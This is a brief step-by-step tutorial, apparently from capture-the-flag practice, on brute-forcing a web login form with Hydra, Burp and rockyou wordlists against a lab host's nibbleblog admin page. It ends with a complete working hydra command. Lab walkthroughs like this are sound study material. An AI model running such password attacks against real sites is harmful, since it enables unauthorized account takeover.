### Hydra: Brute Forcing Web Login Page

---------------------------------------------------------------

1. Intercept a `login request` from **Burp**

---------------------------------------------------------------

2. Copy the **body of the REQUEST** that holds _login stuff_
  + Example: `username=madeup&password=cantguessthis`

---------------------------------------------------------------

3. Replace the _field_ you fill in with `hydara variables`
  - hydra denotes variables with `^` and _ALL CAP NAMES_
   * Like so: `^USER^` / `^PASS^`
  - Example: `username=^USER^&password=^PASS^`

---------------------------------------------------------------

4. Add a colon (`:`) at the end of the _result from step 3_
  + The `:` is a _seporator_ for `hydra`

---------------------------------------------------------------

5. Look at the **body of the RESPONSE** of a _failed login_
   and look for something that identifies _this response_
   as a _failed login_ attempt
  - Example: `Incorrect username`

---------------------------------------------------------------

6. Store the _part of login fail_ from the **response** to 
   the end of the _result from step 4_
  - Example: `username=^USER^&password=^PASS^:Incorrect username`

---------------------------------------------------------------

7. Get the _subdirectory_ of the `URL` of the login page
  + Append a `:` to it
   - Example: `/nibbleblog/admin.php:`
  + Prepend this to the _result of step 6_
   - Example: `/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username`
  + Have this new string in quotes
   - Example: `"/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"`

---------------------------------------------------------------

8. Get a _rockyou text file_
  + Smaller Version:
     `cp /usr/share/wordlists/SecLists/Passwords/rockyou-50.txt .`
  + Full Size
    `cp /usr/share/wordlists/SecLists/Passwords/rockyou.txt .`

---------------------------------------------------------------

9. Craft the final _hydra command_ from the results of
   _step 7 & 8_
 - Example: `hydra -l admin -P rockyou-50.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"`
  * This example is assuming the _target username_ is `admin`
  * Thus the `-l admin`

---------------------------------------------------------------

